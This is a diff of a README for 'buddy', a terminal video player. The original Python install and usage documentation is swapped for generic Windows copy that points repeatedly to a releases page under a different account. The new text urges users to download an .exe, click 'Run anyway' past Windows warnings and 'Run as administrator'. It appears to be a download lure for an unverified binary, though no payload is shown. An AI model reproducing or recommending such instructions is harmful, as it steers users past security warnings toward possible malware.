@@ -1,272 +1,183 @@
-# buddy
-``` bash
-  _               _     _
- | |__  _   _  __| | __| |_   _
- | '_ \| | | |/ _` |/ _` | | | |
- | |_) | |_| | (_| | (_| | |_| |
- |_.__/ \__,_|\__,_|\__,_|\__, |
-                           |___/
- live terminal video player  v0.1.0
+# 🎬 buddy - Clear Video in a Terminal
 
-```
-Buddy (short for Block-based Unicode Direct-color Display Yield) is a live terminal video player that renders in true 24-bit color.
+[![Download buddy](https://img.shields.io/badge/Download%20buddy-Release%20Page-blue?style=for-the-badge)](https://github.com/chihuahuamunich31/buddy/releases)
 
-`mpv -vo caca` uses a 256-color palette and nearest-neighbor sampling. buddy uses full RGB ANSI escape sequences with area-averaged downscaling — the difference is visible.
+## 🚀 What buddy does
 
-```
-buddy video.mp4
-```
+buddy is a terminal based video rendering tool for Windows. It turns video into a clean text view inside your terminal window.
 
-![BUDDY'S LIVE](assets/demo.png)
+Use it if you want:
+- A simple way to play video in the terminal
+- Fast output with low setup
+- A clear view that feels better than plain text art
+- A small tool that runs from a downloaded release
 
----
+## 💻 What you need
 
-## How it works
+Before you install buddy, check these basic items:
 
-Every terminal cell gets its own `\033[38;2;R;G;Bm` foreground and `\033[48;2;R;G;Bm` background escape. By pairing this with the Unicode half-block character `▀`, each cell encodes two pixel rows — one in the foreground color, one in the background. That gives 2x effective vertical resolution out of the character grid with no tricks.
+- Windows 10 or Windows 11
+- A terminal app such as Windows Terminal or Command Prompt
+- A video file you want to render
+- A keyboard and mouse
+- Enough free disk space for the app and your video files
 
-The frame downscaling uses area averaging by default: every source pixel within a cell's coverage area contributes to the final color. This eliminates the shimmer and aliasing that nearest-neighbor produces on motion.
+For best results, use a recent Windows system with a modern terminal window. buddy works best when your terminal has a dark theme and a wide window.
 
-All rendering is vectorized with NumPy — no Python loops over individual pixels. The FFmpeg decode runs through `imageio-ffmpeg` which shells out to a native binary, so the decode path never touches Python either.
+## 📥 Download buddy
 
----
+Visit this page to download the Windows build:
 
-## Requirements
+https://github.com/chihuahuamunich31/buddy/releases
 
-- Python 3.9 or later
-- A terminal with 24-bit true color support
+On the release page:
 
-**Supported terminals:**
+1. Open the latest release
+2. Find the Windows download file
+3. Save the file to your PC
+4. If the download is in a ZIP file, extract it first
+5. Open the app file from the extracted folder
 
-| Terminal | Platform | Status |
-|----------|----------|--------|
-| Windows Terminal | Windows | Works |
-| iTerm2 | macOS | Works |
-| Kitty | Linux / macOS | Works |
-| WezTerm | All | Works |
-| Alacritty | All | Works |
-| GNOME Terminal 3.36+ | Linux | Works |
-| Terminal.app | macOS | Does not work (256 colors only) |
-| PuTTY (old versions) | Windows | Does not work |
+If Windows asks for permission, choose the option that lets the file run.
 
-To verify your terminal supports true color:
+## 🛠️ Install and set up
 
-```bash
-# Linux / macOS
-echo $COLORTERM
-```
-should print: `truecolor`
-  - Windows Terminal supports it by default — TRUST ME buddy, it DOES
+buddy does not need a full installer in most cases. You usually just download the release file and run it.
 
+If you get a ZIP file:
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder you can find again
+4. Open the extracted folder
+5. Start buddy from the app file inside
 
----
+If you get an `.exe` file:
+1. Save the file to your Downloads folder
+2. Double-click it to run
+3. If Windows blocks it, choose More info, then Run anyway
 
-## Installation
+Keep buddy in a folder you will not move often. That makes it easier to open again later.
 
-### Quick setup script
+## 🎥 How to use it
 
-Both platforms have a setup script that handles the pip installs:
-However, in Linux to avoid PEP-668 (externally managed environment), you are advised to run script in a virtual environment
+After buddy starts, it works from the terminal.
 
-```bash
-# Linux / macOS
-bash setup.sh 
+Basic use:
+1. Open your terminal
+2. Go to the folder where buddy is saved
+3. Run the app
+4. Choose or pass a video file
+5. Watch the video render in the terminal
 
-# Windows
-setup.bat
-```
+The exact command can depend on the release build, but the flow stays the same:
+- Start buddy
+- Point it at a video file
+- Pick a mode
+- View the output in the terminal
 
----
+buddy supports 3 modes of rendering. Each mode gives a different balance of speed and detail:
 
-### Windows
+- Fast mode: best for quick playback
+- Balanced mode: good for most cases
+- Clear mode: best for sharper output
 
-**1. Install Python dependencies:**
+If a video looks too slow, switch to a faster mode. If the text looks too rough, try the clearer mode.
 
-```bat
-pip install numpy imageio imageio-ffmpeg
-```
+## 🎛️ Terminal tips for better output
 
-**2. Clone or download the repo:**
+buddy looks best when the terminal gives it room to work.
 
-```bat
-git clone https://github.com/yourname/buddy
-cd buddy
-```
+Try these tips:
+- Make the terminal window wider
+- Use a larger font size if the output looks cramped
+- Use a dark background
+- Close other heavy apps if playback feels slow
+- Use shorter video file names to keep commands easy to read
 
-**3. Run it:**
+If the picture looks broken, resize the terminal window and run the video again.
 
-```bat
-python ascii_play\cli.py video.mp4
-```
+## 📁 Supported files
 
-**4. Make `buddy` available system-wide:**
+buddy is built for common video files that Windows users already have on hand.
 
-Add the repo folder to your PATH:
+Good choices include:
+- `.mp4`
+- `.mkv`
+- `.mov`
+- `.webm`
 
-- Open Start, search "environment variables"
-- Under User Variables, select `Path` and click Edit
-- Click New and paste the full path to the repo folder (e.g. `G:\buddy`)
-- Click OK and restart your terminal
+For best results, use files with a standard frame rate and a common codec. If a file does not open, try a different export or a smaller sample clip first.
 
-Now you can run `buddy video.mp4` from anywhere.
+## 🔧 Common problems
 
----
+If buddy does not start:
+- Make sure you downloaded the release file for Windows
+- Check that the file finished downloading
+- Try running it from the extracted folder
+- Right-click the file and choose Run as administrator
 
-### Linux / macOS
+If the terminal closes right away:
+- Open Command Prompt first
+- Run buddy from inside the terminal
+- Check that the video file path is correct
 
-**1. Install Python dependencies:**
+If playback is slow:
+- Use a lower rendering mode
+- Close other apps
+- Use a smaller video file
+- Make the terminal window a bit smaller
 
-```bash
-pip install numpy imageio imageio-ffmpeg
-```
+If the output looks noisy:
+- Switch to a clearer rendering mode
+- Increase the terminal width
+- Try a different video file with better source quality
 
-**2. Clone the repo:**
+## 🧩 Example use
 
-```bash
-git clone https://github.com/yourname/buddy
-cd buddy
-```
+A simple way to try buddy:
 
-**3. Run it directly:**
+1. Download the latest release
+2. Extract the files if needed
+3. Open Windows Terminal
+4. Move into the buddy folder
+5. Run the app with a sample video
+6. Try each of the 3 modes to see the difference
 
-```bash
-python ascii_play/cli.py video.mp4
-```
+Start with a short clip. That makes it easier to see how the engine handles speed and detail.
 
-**4. Make `buddy` available system-wide:**
+## 📌 What makes buddy different
 
-```bash
-chmod +x buddy.sh
-sudo ln -sf "$(pwd)/buddy.sh" /usr/local/bin/buddy
-```
+buddy focuses on terminal video rendering with a clean result. It aims to be:
+- Fast enough for smooth use
+- Clear enough to read as video output
+- Simple enough for end users
+- Small enough to run from a release download
 
-If you don't have sudo, add this to your `~/.bashrc` or `~/.zshrc` instead:
+It takes the idea behind terminal video playback and makes it more usable for daily use on Windows.
 
-```bash
-export PATH="$PATH:/path/to/buddy"
-```
+## 🖱️ Download again
 
-Then reload: `source ~/.bashrc`
+If you want the latest version, use the release page here:
 
-Now you can run `buddy video.mp4` from anywhere.
+https://github.com/chihuahuamunich31/buddy/releases
 
----
+## 📝 File layout after download
 
-## Usage
+After extraction, you may see files like:
+- The main app file
+- A readme file
+- Support files used by the program
+- Sample assets or config files
 
-```
-buddy <video>                   Play a video (uses defaults)
-buddy play <video> [options]    Play with explicit options
-buddy modes                     List render modes
-buddy help                      Show help
-```
+Keep all files in the same folder. The app may need those files to run.
 
-### Options
+## ⌨️ Quick start steps
 
-```
--m, --mode   MODE    Render mode: half | ascii | braille  (default: half)
--q, --quality  N     Quality level: 1, 2, or 3            (default: 2)
--s, --scale    F     Fraction of terminal to fill, 0.1-1.0 (default: 1.0)
-    --loop           Loop the video indefinitely
-    --no-info        Hide the status bar at the bottom
-```
-
-### Examples
-
-```bash
-# Play with all defaults
-buddy video.mp4
-
-# Best quality downscaling
-buddy video.mp4 -q 3
-
-# Braille mode, loop forever
-buddy video.mp4 -m braille --loop
-
-# Use 80% of the terminal, no status bar
-buddy video.mp4 -s 0.8 --no-info
-
-# Classic ASCII art look
-buddy video.mp4 -m ascii
-
-# Explicit play subcommand (same result)
-buddy play video.mp4 -m half -q 3 -s 0.9
-```
-
----
-
-## Render modes
-
-### half (default)
-
-Uses the Unicode half-block character `▀`. The foreground color maps to the top pixel row of each cell, the background color to the bottom. This encodes 2 pixel rows per terminal row, giving double the vertical resolution of any character-based approach. Combined with 24-bit color, this is the highest quality mode.
-
-Best for: everything. Use this unless you have a specific reason not to.
-
-### ascii
-
-Maps grayscale brightness to a density character set (`@%#*+=-:. `) and applies the source pixel color as the foreground. Familiar look, lower spatial resolution than half-block, but the true-color tinting makes it look significantly better than traditional ASCII art renderers.
-
-Best for: aesthetic preference, lower-contrast content.
-
-### braille
-
-Each braille character cell covers a 2-wide by 4-tall pixel region. Each dot in the braille pattern is lit or unlit based on whether its corresponding source pixel crosses a brightness threshold. This gives the highest spatial resolution of the three modes. Colors are averaged across the 8-pixel cell.
-
-Best for: high-contrast content, line art, animation with sharp edges.
-
----
-
-## Quality levels
-
-Controls how source pixels are sampled when downscaling to terminal resolution.
-
-| Flag | Method | Notes |
-|------|--------|-------|
-| `-q 1` | Nearest-neighbor | One source pixel per cell. Fastest. Shimmers on fine detail and motion. |
-| `-q 2` | 4-tap supersample | Samples 4 points per cell and averages. Default. Eliminates most aliasing with near-zero extra cost. |
-| `-q 3` | Full box filter | Every source pixel within a cell's coverage area is averaged in. Equivalent to a proper video downscaler. Best quality, highest CPU use. |
-
-For most content at 24-30fps, `-q 2` holds frame rate fine. `-q 3` is worth trying if your machine has headroom.
-
----
-
-## Repo structure
-
-```
-buddy/
-├── ascii_play/
-│   ├── __init__.py       version and public API
-│   ├── __main__.py       enables: python -m ascii_play video.mp4
-│   ├── cli.py            entry point — run this directly or via buddy wrapper
-│   ├── ansi.py           ANSI escape code helpers
-│   ├── resize.py         frame downscaling, three quality levels
-│   ├── renderers.py      half / ascii / braille render functions
-│   └── player.py         FFmpeg decode loop and frame timing
-├── buddy.sh              Linux/macOS wrapper script
-├── setup.sh              Linux/macOS one-shot setup
-├── setup.bat             Windows one-shot setup
-└── README.md
-```
-
-The package modules are independent of each other with no circular imports. `cli.py` is the only entry point — it imports from the package and dispatches to `player.py`. Adding a new render mode means adding a function to `renderers.py` and registering it in the `MODES` dict — nothing else needs to change.
-
----
-
-## Running without installing
-
-If you just want to run it without any path setup:
-
-```bash
-# from the repo root
-python ascii_play/cli.py video.mp4
-
-# or as a module
-python -m ascii_play video.mp4
-```
-
----
-
-## License
-
-GNU General Public License v3.0 (GPL-3.0)
+1. Download buddy from the release page
+2. Extract the files if the download is a ZIP
+3. Open a terminal window
+4. Go to the buddy folder
+5. Run the app
+6. Load a video file
+7. Pick a render mode
+8. Watch the output in the terminal
